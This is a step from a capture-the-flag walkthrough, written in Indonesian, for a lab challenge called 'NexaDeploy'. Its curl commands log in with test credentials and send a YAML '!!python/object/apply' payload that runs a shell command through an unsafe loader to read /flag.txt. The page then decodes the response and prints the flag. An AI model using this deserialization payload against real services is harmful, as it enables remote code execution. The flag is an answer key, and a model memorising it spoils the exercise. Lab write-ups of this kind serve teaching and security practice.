# NexaDeploy — Cara mendapatkan flag

[← Overview](63-nexadeploy.md) · [Index](index.md)

> **Langkah 2/5.** Unsafe YAML loader mengeksekusi `!!python/object/apply`, lalu base64 di response di-decode.
>
> **Berikutnya:** [Flag](63-nexadeploy-03-flag.md)

1. Login dan simpan cookie.

```bash
curl -sS -c cookies -d 'email=devops@nexadeploy.test&password=deploy1234' \
  "$HOST/login"
```

2. Kirim konfigurasi yang memanggil `subprocess.check_output`. Loader YAML-nya tidak aman, jadi tag `!!python/object/apply` dieksekusi.

```bash
curl -sS -b cookies \
  --data-urlencode 'name=x' \
  --data-urlencode 'environment=staging' \
  --data-urlencode 'config=!!python/object/apply:subprocess.check_output [["cat","/flag.txt"]]' \
  "$HOST/pipelines/validate"
```

3. Response berisi blok YAML binary:

```text
!!binary |
  TkZYe3k0bWxfdW5TNGYzX2wwNGQzcl90MF9yY2V9Cg==
```

4. Decode:

```bash
echo TkZYe3k0bWxfdW5TNGYzX2wwNGQzcl90MF9yY2V9Cg== | base64 -d
```

```text
NFX{y4ml_unS4f3_l04d3r_t0_rce}
```
